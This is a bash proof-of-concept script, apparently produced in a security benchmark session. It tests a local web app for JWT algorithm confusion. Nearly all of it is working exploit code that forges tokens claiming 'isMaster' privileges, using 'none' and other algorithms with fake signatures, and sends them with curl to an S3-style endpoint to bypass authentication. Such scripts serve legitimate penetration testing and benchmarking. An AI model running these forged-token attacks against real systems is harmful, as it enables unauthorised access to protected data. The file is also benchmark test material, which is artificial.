#!/bin/bash
# POC: Demonstrates JWT algorithm confusion vulnerability by creating JWT tokens with various algorithms (RS256, HS512, HS384, 'none', 'unsigned') and showing they are all accepted by the application despite having invalid or missing signatures.
# Target: ./repo
# Created: 2025-11-07T16:15:37.584Z
# Session: benchmark-XBEN-084-24-mhp1efma

# JWT Algorithm Confusion Attack POC
# Demonstrates that the application accepts JWT tokens with ANY algorithm,
# including invalid ones like 'none' or custom algorithms

set -e

TARGET_URL="${1:-http://localhost:3000}"
BUCKET="gold"

echo "=========================================="
echo "JWT Algorithm Confusion Attack POC"
echo "=========================================="
echo "Target: $TARGET_URL"
echo "Bucket: $BUCKET"
echo ""

# Helper function to create JWT tokens with different algorithms
create_jwt() {
    local alg=$1
    local payload='{"user_id":"attacker","isMaster":true,"iat":1234567890}'
    
    # Base64 encode header and payload
    local header="{\"alg\":\"$alg\",\"typ\":\"JWT\"}"
    local header_b64=$(echo -n "$header" | base64 | tr '+/' '-_' | tr -d '=')
    local payload_b64=$(echo -n "$payload" | base64 | tr '+/' '-_' | tr -d '=')
    
    # Create token with fake/invalid signature
    local signature_b64="fake_signature_thats_invalid"
    echo "${header_b64}.${payload_b64}.${signature_b64}"
}

# Test 1: RS256 algorithm with fake signature
echo "[TEST 1] RS256 algorithm with fake signature"
TOKEN_RS256=$(create_jwt "RS256")
echo "Token: $TOKEN_RS256"
RESPONSE=$(curl -s -w "\n%{http_code}" -X GET \
    -H "x-auth-token: $TOKEN_RS256" \
    "$TARGET_URL/s3/$BUCKET/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: RS256 algorithm accepted despite invalid signature"
    echo "Response snippet: $(echo "$BODY" | head -c 100)..."
else
    echo "✗ REJECTED: HTTP $HTTP_CODE"
fi
echo ""

# Test 2: HS512 algorithm with invalid signature
echo "[TEST 2] HS512 algorithm with invalid signature"
TOKEN_HS512=$(create_jwt "HS512")
echo "Token: $TOKEN_HS512"
RESPONSE=$(curl -s -w "\n%{http_code}" -X GET \
    -H "x-auth-token: $TOKEN_HS512" \
    "$TARGET_URL/s3/$BUCKET/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: HS512 algorithm accepted despite invalid signature"
    echo "Response snippet: $(echo "$BODY" | head -c 100)..."
else
    echo "✗ REJECTED: HTTP $HTTP_CODE"
fi
echo ""

# Test 3: HS384 algorithm
echo "[TEST 3] HS384 algorithm with invalid signature"
TOKEN_HS384=$(create_jwt "HS384")
echo "Token: $TOKEN_HS384"
RESPONSE=$(curl -s -w "\n%{http_code}" -X GET \
    -H "x-auth-token: $TOKEN_HS384" \
    "$TARGET_URL/s3/$BUCKET/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: HS384 algorithm accepted despite invalid signature"
    echo "Response snippet: $(echo "$BODY" | head -c 100)..."
else
    echo "✗ REJECTED: HTTP $HTTP_CODE"
fi
echo ""

# Test 4: 'none' algorithm (should NEVER be accepted)
echo "[TEST 4] 'none' algorithm (signature elimination)"
TOKEN_NONE=$(create_jwt "none")
echo "Token: $TOKEN_NONE"
RESPONSE=$(curl -s -w "\n%{http_code}" -X GET \
    -H "x-auth-token: $TOKEN_NONE" \
    "$TARGET_URL/s3/$BUCKET/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ CRITICAL VULNERABILITY: 'none' algorithm accepted (complete bypass)"
    echo "Response snippet: $(echo "$BODY" | head -c 100)..."
else
    echo "✗ REJECTED: HTTP $HTTP_CODE"
fi
echo ""

# Test 5: Custom/invalid algorithm 'unsigned'
echo "[TEST 5] Custom 'unsigned' algorithm"
TOKEN_UNSIGNED=$(create_jwt "unsigned")
echo "Token: $TOKEN_UNSIGNED"
RESPONSE=$(curl -s -w "\n%{http_code}" -X GET \
    -H "x-auth-token: $TOKEN_UNSIGNED" \
    "$TARGET_URL/s3/$BUCKET/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: Custom 'unsigned' algorithm accepted"
    echo "Response snippet: $(echo "$BODY" | head -c 100)..."
else
    echo "✗ REJECTED: HTTP $HTTP_CODE"
fi
echo ""

# Test 6: Random invalid algorithm
echo "[TEST 6] Random invalid algorithm 'RANDOM_ALG'"
TOKEN_RANDOM=$(create_jwt "RANDOM_ALG")
echo "Token: $TOKEN_RANDOM"
RESPONSE=$(curl -s -w "\n%{http_code}" -X GET \
    -H "x-auth-token: $TOKEN_RANDOM" \
    "$TARGET_URL/s3/$BUCKET/")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Response Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: Arbitrary algorithm 'RANDOM_ALG' accepted"
    echo "Response snippet: $(echo "$BODY" | head -c 100)..."
else
    echo "✗ REJECTED: HTTP $HTTP_CODE"
fi
echo ""

echo "=========================================="
echo "Algorithm Confusion Attack Results:"
echo "=========================================="
echo "All algorithm tests should be REJECTED for secure implementation."
echo "Any ACCEPTED result indicates algorithm confusion vulnerability."
echo ""